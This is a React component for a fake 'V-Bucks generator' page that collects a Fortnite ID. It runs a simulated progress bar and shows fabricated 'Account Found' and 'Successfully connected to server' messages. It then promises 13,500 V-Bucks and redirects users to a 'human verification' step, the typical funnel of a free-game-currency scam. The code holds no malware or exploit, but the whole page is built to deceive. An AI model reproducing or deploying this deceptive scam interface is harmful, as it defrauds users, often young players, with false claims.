
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useToast } from "@/components/ui/use-toast";
import { motion } from "framer-motion";
import { ChevronLeft, ChevronRight, Shield, Check, AlertTriangle } from "lucide-react";
import ProgressBar from "@/components/ProgressBar";
import DeviceSupport from "@/components/DeviceSupport";

const Generator = () => {
  const [username, setUsername] = useState("");
  const [currentStep, setCurrentStep] = useState(1);
  const [isProcessing, setIsProcessing] = useState(false);
  const [progress, setProgress] = useState(0);
  const navigate = useNavigate();
  const { toast } = useToast();

  const handleNext = () => {
    if (!username) {
      toast({
        title: "Error",
        description: "Please enter your Fortnite ID",
        variant: "destructive",
      });
      return;
    }

    setIsProcessing(true);
    
    // Simulate processing
    let currentProgress = 0;
    const interval = setInterval(() => {
      currentProgress += 5;
      setProgress(currentProgress);
      
      if (currentProgress >= 100) {
        clearInterval(interval);
        setIsProcessing(false);
        setCurrentStep(2);
      }
    }, 100);
  };

  const handleVerify = () => {
    toast({
      title: "Verification Required",
      description: "Redirecting to verification...",
    });
    navigate("/verify");
  };

  return (
    <div className="min-h-screen flex flex-col bg-fortnite-gradient">
      <header className="container mx-auto py-4 flex items-center justify-between">
        <Button
          variant="ghost"
          size="sm"
          className="text-white"
          onClick={() => navigate("/")}
        >
          <ChevronLeft className="mr-1 h-4 w-4" /> Back
        </Button>
        
        <h1 className="text-2xl md:text-3xl font-bold text-white">
          <span className="text-fortnite-blue">V</span>-BUCKS GENERATOR
        </h1>
        
        <div className="w-[68px]"></div> {/* Spacer for centering */}
      </header>
      
      <div className="flex-1 container mx-auto py-8 px-4 flex flex-col items-center justify-center">
        {currentStep === 1 ? (
          <motion.div 
            className="w-full max-w-md bg-black/40 backdrop-blur-sm rounded-xl p-6 border border-white/10"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.3 }}
          >
            <div className="text-center mb-6">
              <img 
                src="/photos/9412ada4-d672-4c84-86c2-310031f45228.png" 
                alt="Fortnite" 
                className="w-16 h-16 mx-auto rounded-lg mb-2"
              />
              <h2 className="text-xl font-bold">Enter Your Fortnite ID</h2>
              <p className="text-sm text-white/70">
                Make sure to enter a correct Fortnite User ID without any additional symbols.
              </p>
            </div>
            
            <div className="space-y-4">
              <div>
                <Input
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="Your Fortnite ID"
                  className="bg-white/10 border-white/20 placeholder:text-white/50"
                />
              </div>
              
              <div className="text-center">
                <Button 
                  onClick={handleNext} 
                  disabled={isProcessing}
                  className="w-full bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold"
                >
                  {isProcessing ? (
                    <span className="flex items-center gap-2">
                      Processing <ProgressBar progress={progress} />
                    </span>
                  ) : (
                    <span className="flex items-center gap-2">
                      Continue <ChevronRight className="h-4 w-4" />
                    </span>
                  )}
                </Button>
              </div>
              
              <DeviceSupport />
            </div>
          </motion.div>
        ) : (
          <motion.div 
            className="w-full max-w-md bg-black/40 backdrop-blur-sm rounded-xl p-6 border border-white/10"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.3 }}
          >
            <div className="text-center mb-6">
              <div className="flex items-center justify-center mb-3">
                <Shield className="h-12 w-12 text-fortnite-blue" />
              </div>
              <h2 className="text-xl font-bold">Account Found</h2>
              <div className="flex items-center justify-center gap-1 mt-1 text-green-400">
                <Check className="h-4 w-4" />
                <span className="text-sm">Successfully connected to server</span>
              </div>
            </div>
            
            <div className="bg-white/5 rounded-lg p-4 mb-6">
              <div className="flex items-center gap-3 mb-2">
                <img 
                  src="/photos/9412ada4-d672-4c84-86c2-310031f45228.png" 
                  alt="Fortnite" 
                  className="w-10 h-10 rounded-lg"
                />
                <div>
                  <p className="text-sm text-white/70">Username</p>
                  <p className="font-bold">{username}</p>
                </div>
              </div>
              
              <div className="border-t border-white/10 mt-3 pt-3 flex items-center justify-between">
                <div>
                  <p className="text-sm text-white/70">Selected Package</p>
                  <p className="font-bold text-fortnite-yellow">13,500 V-Bucks</p>
                </div>
                <img 
                  src="/photos/db7a7d39-3733-4f08-a030-a1a0e1717205.png" 
                  alt="V-Bucks"
                  className="w-10 h-10"
                />
              </div>
            </div>
            
            <div className="bg-amber-500/10 border border-amber-500/30 rounded-lg p-3 mb-6">
              <div className="flex items-start gap-2">
                <AlertTriangle className="h-5 w-5 text-amber-500 flex-shrink-0 mt-0.5" />
                <p className="text-sm">
                  To prevent abuse, we require all users to complete human verification. This helps us maintain the service free of charge.
                </p>
              </div>
            </div>
            
            <div className="text-center">
              <Button 
                onClick={handleVerify}
                className="w-full bg-fortnite-blue hover:bg-fortnite-blue/90 text-white font-bold"
              >
                Verify Now
              </Button>
              
              <p className="text-xs text-white/50 mt-3">
                By clicking "Verify Now", you confirm that you've read and agreed to our Terms of Service.
              </p>
            </div>
          </motion.div>
        )}
      </div>
      
      <footer className="py-4 border-t border-white/10">
        <div className="container mx-auto px-4">
          <p className="text-xs text-white/40 text-center">
            All trademarks, service marks, trade names, trade dress, product names and logos appearing on the site are the property of their respective owners.
          </p>
        </div>
      </footer>
    </div>
  );
};

export default Generator;
